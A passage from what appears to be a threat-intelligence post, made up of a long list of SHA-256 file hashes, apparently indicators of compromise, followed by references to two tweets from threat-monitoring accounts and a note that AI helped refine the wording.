0be0462645b77be0b8e5074a1a1079565b3458ba0bfd509d7c6bb4eb64ec6dd6
7466878a7b9b0ca12c4339e7ee955a06d27b45816cd5bd589e62ed10b034b2a0
85ab0d0948f3475af76d58671a9f5ff03810655447e25293a6a58d22d8ca119d
2fc771e3b0a5747deffc29a4b7f7a00cc933afeedda16f9b77e71490fb76fe48
65bf2d8dfe6d67938bf277d903ae25ee435331b9e55bf7677ef78450831c10a5
75600720420f6effd99b621078b46de83dfeca1548f3275c7d36de80b7e05e9d
a46e0ca373ebb35f5c7f6e95225e455fd3c0c45e790035464353f2e3c350ff94
00979e9f4133a34279d60dc18c82e9a6590a8184c3bb220a823f6beab61da448
cef07c64ca9a8736a21015fd1c48e3cc4840c55a9d5487cdd7b10e968de66f6e
26cfc7bc64faed681f67508e98bd0fe72ece027a3fef542267f763ef79f27298
9818de9f3aab1b3c79d81abfa6f890dfd066e34e21f94cc7dd2c987a0aae4df5
1c37b3999aa6787bcdf115752947ed91b1f6a5237a3680baf6c0e95476591e37
166c14737102af3961e12a5e5ed0e6588ade581b3ec9ac70403047e62ae6801a
6cf3a62b6567e62fa0122ac33bf4e3fb6c0526efad7a9c46888eee47e0566a96
d3a6c05da99e1e0062d3494536db6d0016b6c15ca5218dc27918ee35a01bcb99
77c26580b2342b1cde2d34a64c612db65a92e427a0abc4c0a5665e5ac189e82a
9efb51da326cede66230b5d7f81838e259d66a2d7429d726d878d90a729254ac
5666f77d17fccd6acb3889f26977cbdd14deb2bcc8d024b3551d084f8f0d6f18
5e4174b7fafbcb8036dc3b3af1137211fc45476cedde4dcb922bc4513c9a64e8
e759ef2672e24f88e2b01422a716a88f778b686ca542c797d275cd8f4024729c
6b3c3f92c32790bcda6c978aff0ddffd1e6295caf42638c2b8a0032d1c68c46b
2d85a4768aeaef74ec5e950fe7b36fc4b92e6eac026befdbc56de570bbeb709a
a6fe402b2bb9adf234de1e40c24376e54f798d6d1a947d927b2b7b8944088f1b
438189bd420d57ff75113c6d1b7dee7fd5c568b0bd76760f0642de91acda0df5
e98a5a47f85c1f005a51ae3d7c17f9b0369ae1b90a68df7595608b0456b29577
9078289fe3063f858179f85da42064e92172b937c1f029c46f73bd4e86d571ad
3bcbbcb05cf8bc618657e9bd267bf86889e8e432f3c669a7115293604cbeac65
7345af6d586dd50f7c182e333c99d6465c12b8d195a78633a8bdfa9055cbf0fe
90335eada2e6338c51c033b9a6625ae3af508e81c210972c59b3f2300a635c5a
ef9d0933f1736b1ee16c54209b1e780c0b8d2d2a592d4d333275ba41982d969e
98604295ca0913d9419cdb49b2e8a726af33b5c5c6bdb6ec617ec130d7e000e3
af61b27c017929171ea9b1110fa796e85192dd0acec90424ca7ab686750b6371
de68b153769fe824f52d52e9c260bd8458c18d800bad7146827274fb19c3bf35
86ae8d89f437240a821ab167c4cb69c7651fea345c2cea70440487cde98d27a0
ab88ef457f7b776fb5d1c0d7578324cfb5dc994a6bc975619e222078b707dbf2
87eb007fed866aa1953b95a34a0b418e361d481e161d3c6687633627bad196ed
b94c50baa6ee9248c83d92b709ffddf774080138c71c321fe261a8c5054d74aa
b177f7a7c764f96b6f60eea74014b18af23129f92c9ed34a76a46a0e111b5e26
965c2daa56a733843ea3ed7602f4b18e8d769aaca29305c3bd6d09313983de12
be637ef3062f901deaac204bc1c82add519cdfe6c41c1261c142450fc75ede66
3565e69b19909370b308a81af94e5f8fc9227cc303c03d935773aaeba4e1279a
19c281410243bff6522175b64c23a9e796bf1e814333f9d44568a8010e611aec
95c436e027728c763ab1a2425cd8ebfb7c09cf024de3d1f955e03297801f363c
677eaaaa3b632832b515c6aeb3396af23dd0868a5f914683e913b6ac48f3bb44
d05abbe89de929e1d7803a996118fe8eed08159bfb685d1312702d6cbe666fc7
3773bf86820e9bdb124924374606437f5dc25f5b3cb16bab0080183d97bafd3c
90c34924ceb4c804dee5bbb9d17b07e077d6a30e0064a948e9b6bee274af914a
7cbdd5f4355552baa1cfaa58ff7de5b88a95241577968ef5d9bae5bd8c98875b
c8588c7ef956c784fba323e0d8563a97fe9b49eadf9135025f8bf497b8013fc4
4cd9ea8f413c4be47ccfe8ef65698b5cfac050669fdc3f4a614c0ca030e3b475
7652895276fb0425db1a6f4c03df604dce9ec139a6e0a7d7f14fddf1a347921b
a8cbef42908b5f1295dff11140993538f4cda257bf7e69fa0db72ae3f43d1f73
5a5df4b8bc2cac0051501ccaf61b4e668531bc518400737e75830079ea21b276
2f9e4a0572ea20e87b7bc79fa531c97bb9416de604b6baf18f2c766bca487f70
5dcfe6af8a8b7f1c6482039916afdd9b0faf512552574ada0eda4d806e1bb169
b484eff60fb535d9d51e644aa98335e0837b3c72b192011a91cd63bbed95c1df
058cbd9cd7a9e455a1ff8b3d1247ff002ff6baa76573ea2a0d73718fc13b9985
a1c5f5dc8793d984628cee6a1716b44c4f4932845736222bdcbdabda98bbe750
08dd4e21b215f5fa5784de3eee8f383e14bf2925eccb7149a5b1cf527f004def
b8154813ff4cf1299720dcc2fa917b9fd5302fcd8b894e2d07ed04568ee22051
697804af9e43efdefbac1c8126f7aa6983666606025fa7a4310103ab28f4a87e
aea20c16a7398c98c6e60a54b38258310da38f46ac0d3c5cc1398693ecccc3b6
ad04423f5057e33c3e282cfcba39fd73a459fbe4e0706dba8f003d929dbb9048
2e23c2476237a8b6e0584d3c71b8ad77504588a212178df3add02c56feda40cf
9b270fcb76aa9af713947960613cd5eefbf66941aef1b36a5fe973842c3067b7
d9321e78ec43f5e187c8e00c075918372650f18be92dfda84320eb1bc6a59af3
4832bb01e9dbedb009e87fbcc0ae09bbb5918d034fad2019a78150b49556a3da
e4513c399515fe7ccf0971ba931c1a179801108a873ee8e31eccf180a9a3a194
254e69fe083e322955433648f8541b672a0d87d9662575ef3a894e192cb06191
051064465cc3faf5addd8fa52e0a6717b23d9780522d880d1d6b62d3c006c338
8b4e21ea4bcdeee5559038d91b8f9ba1658f89cc153964a8ef87de79beb4e561
f9d41bc4e102fd1de926581322a1540cc41e4606fe51b329409cea55b587f2bf
dd90e4204ec2bf4e11d1686a22086e24f44c342f4db8b1aab6fbe7cfd4a02a08
78df136979c9e392c24f26c5d2a975353224188a3fae72fb51a5cf09be7f6d06
c87ee7e9e4e0d1bd41f96ebbc1bade86d4018513b5bb483f7da092aadd811a06
4060b03a77a31d78c292654125b1996f9551a3e4745119a26915d7b2dd8fc02b
fbcea0b641183cf90509e96525c638e9ec687b66e9cdaef4d204af715c1eaadc
813697a90e7d04961ae3b0731a1578eb2f1bece74c2f5d762d2c2f6c97cf1f68
d92b598da86430b630d40e570a0ab9a8098071aea685e48da00b1440887f71d5
9d27629c7a2666fdf7f565c1cf17234298910f8354869ecb3c76115974eedc2f
4eed1a1b0ec3368b8bc41a61d1c0cd62596631c7d24ed86e4ee5908f096a1296
```

# References

- [https://twitter.com/FalconFeedsio/status/1748260587627495540](https://twitter.com/FalconFeedsio/status/1748260587627495540)
- [https://twitter.com/DailyDarkWeb/status/1748450257019814069](https://twitter.com/DailyDarkWeb/status/1748450257019814069)

**I utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision.**
